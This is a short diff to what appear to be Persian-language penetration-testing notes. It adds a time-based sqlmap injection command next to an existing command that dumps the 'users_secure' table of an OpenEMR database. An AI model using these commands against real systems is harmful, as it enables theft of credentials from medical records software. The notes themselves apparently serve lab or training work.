@@ -487,7 +487,12 @@ sqlmap.py -r req.txt
 
 ```text
 sqlmap -r req -D openemr -T users_secure --dump
+```
 
+### استفاده از تکنیک تاخییر
+
+```text
+sqlmap -r req  --technique=T
 ```
 
 ## msf
